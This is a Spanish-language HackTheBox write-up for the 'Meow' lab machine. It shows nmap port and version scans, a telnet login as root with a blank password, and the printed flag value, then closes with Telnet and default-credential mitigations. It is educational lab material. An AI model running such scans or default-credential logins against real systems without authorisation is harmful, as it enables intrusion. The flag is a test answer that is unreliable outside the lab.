---
layout: post
title: HTB — Meow (Telnet)
date: 2026-04-26
platform: HackTheBox
difficulty: Very Easy
description: Telnet
tags:
  - Telnet
  - Linux
---
**Meow** es la primera máquina de la sección **Starting Point**, aunque es extremadamente sencilla, enseña algo que se repite en entornos reales con consecuencias devastadoras: **servicios mal configurados con credenciales por defecto**

----
## Reconocimiento

Verificamos que la máquina responde utilizando un ``ping``:

```bash
ping -c 1 10.129.x.x
```

La primer regla del pentestig: **nunca supongas nada, siempre escanea**. Primero deseo saber que servicios están corriendo en el objetivo. Para eso uso ``nmap``:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.x.x -oG allports
```

**Flags utilizadas:**
+ `-p-` — Escanea los 65535 puertos
- `-sS` — SYN scan (sigiloso, no completa el hanshake TCP)
- `--open` — Muestra solo puertos abiertos
- `--min-rate` - Envía mínimo 5000 paquetes por segundo
- `-vvv` - Verbose: muestra resultados en tiempo real
- `-n` - Sin resolución DNS (más rápido)
- `-Pn` - Omite el host discovery (asume que el host está activo)\
- `-oG` - Guarda el output en formato Grepeable

**Información relevante:**
```bash
PORT   STATE SERVICE
23/tcp open  telnet  
```
Un solo puerto abierto. Puerto ``23``, servicio ``Telnet``.

Realizo un escaneo de versión  y servicios en ese puerto:

```bash
nmap -sCV -p23 10.129.x.x -oN target
```

**Flags utilizadas:**
+ `-sC` — ejecuta scripts de detección por defecto
- `-sV` — detecta versiones de los servicios
- `-oN` — guarda el output en un archivo de texto

**Información relevante:**

```bash
PORT STATE SERVICE VERSION 
23/tcp open telnet Linux telnetd
```
---

## Explotación
Con solo Telnet expuesto, la superficie de ataque es mínima. La pregunta es: ¿está protegido con credenciales robustas?

Me conecto al servicio:

```bash
telnet 10.129.x.x
```

La máquina responde con un banner de login. Lo primero que cualquier pentester prueba en estos casos son **credenciales por defecto**: ``admin``, ``administrator``, ``guest``... y el clásico ``root``.

```bash
Meow login: root
```

Sin contraseña. Solo **Enter**

```bash
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
root@Meow:~#
```
---
# Flag
Una vez dentro, localizo la flag:

```bash
ls
# flag.txt snap

cat flag.txt
# b40abdfe23665f766f9c61ecba8a4c19
```

### ¿Qué aprendemos de esto?

Meow parece trivial, y técnicamente lo es. Pero el vector de ataque que demuestra —**credenciales por defecto en servicios legacy**— aparece constantemente en auditorías reales. Algunos puntos clave:

**Telnet no debería existir en sistemas modernos.** El protocolo no cifra nada. Cualquiera que esté en la misma red puede interceptar las credenciales en texto plano con un simple sniffer. SSH reemplazó a Telnet hace décadas por razones muy concretas.

**Las credenciales por defecto son una vulnerabilidad crítica.** Routers, cámaras IP, paneles de administración, bases de datos... todos tienen usuarios y contraseñas que vienen configurados de fábrica. Si no se cambian antes de exponer el servicio, se convierten en puertas de entrada triviales.

**La enumeración siempre es el primer paso.** Incluso en una máquina con un solo puerto, el proceso metodológico no cambia. Escanear, identificar, analizar, explotar. El orden importa.

---
### Resumen técnico

|Elemento|Detalle|
|---|---|
|Puerto|23/tcp (Telnet)|
|Vulnerabilidad|Credenciales por defecto (`root` sin contraseña)|
|Acceso obtenido|Root directo|
|Herramientas|`nmap`, `telnet`|
|Mitigación|Deshabilitar Telnet, usar SSH, cambiar credenciales por defecto|
